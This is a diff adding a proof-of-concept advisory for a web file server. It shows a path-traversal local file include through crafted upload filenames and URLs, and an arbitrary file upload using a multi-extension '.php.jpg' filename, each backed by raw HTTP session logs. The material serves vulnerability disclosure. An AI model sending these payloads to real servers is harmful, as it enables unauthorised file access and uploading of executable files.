@@ -1,0 +1,102 @@
+1.
+
+http://www.example.com:5080/Local/../../<[var]/mobile>
+
+
+PoC: File Name - Index Dir Listing
+
+<table><caption>Files at /Local/</caption><thead><tr><th scope="col"></th><th scope="col">Name</th><th scope="col">Size</th>
+<th scope="col">Modified</th></tr></thead><tbody><tr><td class="fileicon"><img src="/WebGears/icon_folder.png"></td>
+<td><a href="..">..</a></td><td>--</td><td>--</td></tr><tr class="odd"><td class="fileicon"><img src="/WebGears/icon_other.png" 
+height="43" width="43"></td><td><a href="<../../[LOCAL FILE INCLUDE VULNERABILITY!]"></a></td>
+
+
+--- PoC Session Logs (POST) ---
+
+Status: 200[OK]
+POST http://www.example.com:5080/Local/ 
+Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] 
+Content Size[1732] 
+Mime Type[text/html]
+   
+Request Headers:
+Host[www.example.com:5080]
+User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0]
+Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+Accept-Language[en-US,en;q=0.5]
+Accept-Encoding[gzip, deflate]
+DNT[1]
+Referer[http://www.example.com:5080/Local/]
+Connection[keep-alive]
+   
+Post Data:
+POST_DATA[-----------------------------130981526715722
+Content-Disposition: form-data; name="file"; filename="<<../../[LOCAL FILE INCLUDE VULNERABILITY!]">"
+Content-Type: application/octet-stream
+-----------------------------130981526715722
+Content-Disposition: form-data; name="button"
+
+Submit
+-----------------------------130981526715722--]
+   
+Response Headers:     
+Accept-Ranges[bytes]
+Content-Length[1732]
+Content-Type[text/html; charset=utf-8]
+Date[Sa., 12 Okt. 2013 19:21:11 GMT]
+
+
+
+
+2.
+
+http://www.example.com:5080/Local/arbitrary-file-upload.png.txt.iso.js.html.php.jpg
+
+--- PoC Session Logs (POST to GET) ---
+Status: 200[OK]
+
+POST http://www.example.com:5080/Local/ 
+Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] 
+Content Size[1478] 
+Mime Type[text/html]
+   
+Request Headers:
+Host[www.example.com:5080]
+User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0]
+Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+Accept-Language[en-US,en;q=0.5]
+Accept-Encoding[gzip, deflate]
+DNT[1]
+Referer[http://www.example.com:5080/Local/]
+Connection[keep-alive]
+   
+Post Data:
+POST_DATA[-----------------------------5756737516163
+Content-Disposition: form-data; name="file"; filename="arbitrary-file-upload.png.txt.iso.js.html.php.jpg"
+Content-Type: image/jpeg
+?PNG
+
+
+Status: 200[OK]
+GET http://www.example.com:5080/Thumbnails/Local/arbitrary-file-upload.png.txt.iso.js.html.php.jpg 
+Load Flags[LOAD_NORMAL] 
+Content Size[11070] 
+Mime Type[application/x-unknown-content-type]
+   
+Request Headers:
+Host[www.example.com:5080]
+User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0]
+Accept[image/png,image/*;q=0.8,*/*;q=0.5]
+Accept-Language[en-US,en;q=0.5]
+Accept-Encoding[gzip, deflate]
+DNT[1]
+Referer[http://www.example.com:5080/Local/]
+Connection[keep-alive]
+   
+Response Headers:
+Accept-Ranges[bytes]
+Content-Length[11070]
+Date[Sa., 12 Okt. 2013 19:09:28 GMT]
+
+
+
